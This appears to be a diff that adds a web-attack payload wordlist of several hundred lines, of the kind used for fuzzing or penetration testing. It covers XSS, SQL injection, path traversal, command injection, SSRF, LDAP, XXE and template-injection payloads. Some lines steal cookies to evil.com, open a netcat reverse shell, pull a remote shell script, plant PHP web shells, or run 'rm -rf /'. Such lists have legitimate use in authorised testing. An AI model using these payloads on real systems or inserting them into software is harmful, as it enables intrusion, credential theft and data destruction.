@@ -1,0 +1,313 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<math href="javascript:alert(1)">Click</math>
+<a href="javascript:alert(1)">Click</a>
+<details open ontoggle=alert(1)>
+';alert(1);// 
+<img src="x:x" onerror="alert(1)">
+<marquee onstart=alert(1)>
+<object data="javascript:alert(1)">
+<link rel="stylesheet" href="javascript:alert(1)">
+' OR 1=1 --
+' OR '1'='1
+" OR 1=1 --
+1' OR '1'='1
+' OR 1=1#
+admin' --
+' OR '' = '
+admin' OR '1'='1
+') OR ('1'='1
+' OR 1=1 LIMIT 1;--
+../etc/passwd
+../../../../etc/passwd
+/etc/passwd%00
+/proc/self/environ
+../../../../../../windows/win.ini
+http://evil.com/shell.txt?
+http://site.com/index.php?page=../../../../etc/passwd
+http://site.com/index.php?page=http://evil.com/shell.txt
+;ls -la
+;cat /etc/passwd
+;uname -a
+;curl http://evil.com
+;wget http://evil.com/shell.sh
+& ping -c 4 evil.com
+& whoami
+| id
+| nc -e /bin/bash evil.com 4444
+'); DROP TABLE users; --
+<script>document.location="http://evil.com?cookie="+document.cookie</script>
+javascript:alert(document.cookie)
+onmouseover="alert('XSS')"
+<div onpointerenter=alert(1)>X</div>
+<base href="javascript://">
+<img src onerror=confirm(1)>
+<script src=//evil.com/xss.js>
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Csvg/onload=alert(1)%3E
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<isindex type=image src=1 onerror=alert(1)>
+<video><source onerror="alert(1)">
+<form><button formaction="javascript:alert(1)">X</button>
+<input onmouseover="alert(1)" autofocus>
+' or sleep(5)--
+' or benchmark(1000000,sha1('A'))--
+' or pg_sleep(5)--
+' union select null, null, version() --
+' and ascii(substr(database(),1,1))=100 --
+admin' or 1=1-- 
+%27%20OR%201%3D1--
+1; DROP TABLE users
+1; SELECT * FROM users
+1' or '1' = '1' --
+1 AND 1=1
+1 AND 1=2
+1' AND 1=1 --
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src="javascript:alert('XSS')">
+<script>alert(document.domain)</script>
+<script>eval('alert(1)')</script>
+" onfocus="alert(1)
+" onclick="alert(1)
+<b onmousemove="alert(1)">Move</b>
+<textarea autofocus onfocus=alert(1)>
+<button onmouseover=alert(1)>Click</button>
+<img src=1 href=1 onerror="javascript:alert(1)">
+<meta http-equiv="Set-Cookie" content="name=value">
+<!--#exec cmd="ls"-->
+<?php system($_GET["cmd"]); ?>
+${jndi:ldap://evil.com/a}
+${hostName}
+<%= Runtime.getRuntime().exec("calc") %>
+<% out.println("XSS") %>
+{7*7}
+&apos; OR &apos;1&apos;=&apos;1
+<img src=x onerror=prompt(1)>
+<a href="javascript:alert(1)">XSS</a>
+<embed src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<script>alert(atob('WFNT'))</script>
+"accesskey="X" onclick="alert(1)
+<div style="background:url(javascript:alert(1))">
+<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<script>alert(document.URL)</script>
+<script>alert(navigator.userAgent)</script>
+' OR 1=1; --
+' OR 'a'='a
+' OR 1 GROUP BY CONCAT(username, password) --
+" OR ""="
+' UNION SELECT null,null--
+1' ORDER BY 1 --
+1' ORDER BY 10 --
+' AND 1=1 --
+' AND 1=2 --
+' HAVING 1=1 --
+1' OR sleep(5)--
+' OR '1'='1' -- -
+<img src="javascript:prompt(1)">
+<script>window.location='http://evil.com?steal='+document.cookie</script>
+<svg><desc><![CDATA[--><script>alert(1)</script>]]></desc></svg>
+<!--<script>alert(1)</script>-->
+<script>alert(String.fromCharCode(88,83,83))</script>
+'; exec xp_cmdshell('dir'); --
+admin' WAITFOR DELAY '0:0:5'--
+' OR IF(1=1, SLEEP(5), 0)--
+<script>new Image().src="http://evil.com/"+document.cookie</script>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<frame src="javascript:alert(1)">
+"><svg/onload=alert(1)>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+<?php echo system("ls"); ?>
+{{7*7}}
+{{"".__class__.__mro__[1].__subclasses__()[396]("calc",shell=True,stdout=-1).communicate()}}
+<script>fetch('http://evil.com?cookie='+document.cookie)</script>
+<svg><g onload="alert(1)"></g></svg>
+<marquee loop="1" onfinish="alert(1)">X</marquee>
+"><img src=x onerror=confirm(1)>
+'; waitfor delay '0:0:5'--
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<video><track onloadstart=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<math><mtext></title><script>alert(1)</script>
+<a href=data:text/html,<script>alert(1)</script>>
+<applet code="javascript:alert(1)">X</applet>
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>">
+<svg><foreignObject><iframe onload=alert(1)></iframe></foreignObject></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<xml><x:script><![CDATA[alert(1)]]></x:script></xml>
+%0a<script>alert(1)</script>
+<svg><script>alert(1)</script></svg>
+' OR '1'='1
+" OR ""="
+admin' --
+') OR ('1'='1
+"; DROP TABLE users; --
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+<svg/onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+; ls
+&& whoami
+| cat /etc/passwd
+; echo "Hacked"
+|| rm -rf /
+../../../../etc/passwd
+../config.php
+/../../../windows/system32/drivers/etc/hosts
+....//....//etc/shadow
+/var/www/html/index.php
+http://localhost:8080
+file:///etc/passwd
+http://127.0.0.1/admin
+ftp://example.com
+gopher://localhost:22
+' OR '2'='2
+" OR """="
+test' --
+') OR ('2'='2
+"; DELETE FROM logs; --
+<script>confirm('XSS')</script>
+<img src=y onerror=confirm(2)>
+'">alert(2)</script>
+<svg/onload=confirm(2)>
+<iframe src="javascript:confirm(2)"></iframe>
+; pwd
+&& id
+| grep "root" /etc/passwd
+; touch evil.txt
+|| mkfifo trojan
+../../../../../etc/shadow
+../backup.php
+/../../../../Program Files/Common Files/system/drivers/etc/hosts
+....//....//../etc/group
+/var/log/apache2/access.log
+http://127.0.0.1:80
+file:///etc/shadow
+http://localhost/secret
+sftp://user:pass@example.com
+dict://localhost:11211/INFO
+' UNION SELECT 1,2,3--
+" UNION SELECT null,version(),null--
+'; EXEC xp_cmdshell 'net user'--
+"); INSERT INTO users (username, password) VALUES ('hacker', 'pwned'); --
+' OR SLEEP(5) --
+<body onload=alert('XSS')>
+<input type="image" src="x" onerror="alert(3)">
+`'><script>alert(3)</script>`
+<details open ontoggle=alert(3)>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg=="></object>
+; cat /etc/hostname
+&& ping -c 3 google.com
+| head -n 1 /etc/passwd
+$(whoami)
+`whoami`
+/../../../../var/log/auth.log
+....\/....\/....\/etc/passwd
+/%2e%2e%2fetc/passwd
+..;/etc/passwd
+WEB-INF/web.xml
+http://[::1]:80
+file:///proc/self/status
+http://nonexistent.local
+ldap://localhost:389
+tftp://localhost:69/file.txt
+*)
+(|(objectClass=*))
+(&(objectClass=*)(uid=*))
+(username=*)
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
+<foo>&xxe;</foo>
+<!DOCTYPE replace [<!ENTITY example "World"> ]>
+ <string>Hello &example;!</string>
+{{7*7}}
+{{config.items()}}
+{{self.environment.from_string("{{().__class__.__bases__[0].__subclasses__()[178].__init__.__globals__.__builtins__.eval(\"__import__('os').popen('id').read()\")}}").render()}}
+test.php.txt
+test.php%00.jpg
+test.phtml
+test.svg
+<iframe src="http://hedefsite.com" width="500" height="500" style="position:absolute;top:0;left:0;opacity:0.5;"></iframe>
+' OR 1=1 --
+" OR 1=1 --
+'); DROP TABLE products; --
+"); TRUNCATE TABLE orders; --
+') UNION ALL SELECT null, null, @@version --
+"<script src=//evil.com/xss.js></script>"
+<iframe srcdoc="<script>alert(4)</script>"></iframe>
+<object type="text/html" data="javascript:alert(4)"></object>
+; net user
+&& ipconfig /all
+| tail -n 5 /var/log/syslog
+; systeminfo
+|| netstat -ano
+../../../../../../../../etc/passwd
+../wp-config.php
+/../../../../../../Windows/system.ini
+....//....//....//....//etc/shadow
+/var/www/logs/error.log
+http://localhost:80
+file:///c:/windows/win.ini
+http://192.168.1.1/login.php
+smtp://localhost:25
+imap://localhost:143
+(objectClass=user)
+(&(objectClass=*)(cn=*admin*))
+(mail=*)(objectClass=person)
+<!DOCTYPE data [ <!ENTITY remote SYSTEM "http://evil.com/file.xml"> ]>
+<data>&remote;</data>
+<!DOCTYPE message [ <!ENTITY % payload SYSTEM "file:///dev/random"> %payload; ]>
+<message>test</message>
+{{request.application.config}}
+{{url_for.__globals__['os'].popen('ls -l').read()}}
+image/x-php
+image/svg+xml
+shell.jsp
+<?php system($_GET['cmd']); ?>
+<iframe src="http://baska-site.com" width="600" height="600" style="position:fixed;top:0;left:0;opacity:0.8;"></iframe>
+' OR true --
+" OR true --
+'); INSERT INTO comments (text) VALUES ('XSS denemesi'); --
+"); UPDATE users SET password = 'hacked' WHERE username = 'admin'; --
+') SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --
+<script>window.location='http://evil.com'</script>
+<link rel="stylesheet" href="javascript:alert(5)">
+'"><img src=x onerror=alert(5)>
+<input onfocus=alert(5) autofocus>
+<marquee onstart=alert(5)>
+; whoami > output.txt
+&& dir /b
+| sort /r /etc/passwd
+; type important.txt
+|| tasklist
+../../../../../../../../var/log/apache2/error.log
+../.htaccess
+/../../../../../../ProgramData/Microsoft/Windows/wpa.dbl
+....//....//....//....//....//etc/passwd
+/var/www/html/uploads/image.jpg
+http://127.0.0.1:443
+file:///opt/lampp/htdocs/index.php
+http://[2001:db8::1]/
+pop3://localhost:110
+nntp://localhost:119
+(givenName=*)(sn=*)
+(&(objectClass=*)(!(objectClass=computer)))
+(description=*)
+<!DOCTYPE member [ <!ENTITY file SYSTEM "file:///etc/hostname"> ]>
+<member>&file;</member>
+<!DOCTYPE report [ <!ENTITY % param1 SYSTEM "file:///etc/issue"> <!ENTITY % ex '<!ENTITY eval "%param1;">'> %ex; ]>
+<report>&eval;</report>
+{{lipsum.__globals__.os.popen('cat /etc/passwd').read()}}
+{{cycler.__init__.__globals__.os.popen('date').read()}}
+file.php5
+file.inc
+file.shtml
+<?php eval($_POST['code']); ?>
+<iframe srcdoc="&lt;script&gt;alert(6)&lt;/script&gt;"></iframe>
+
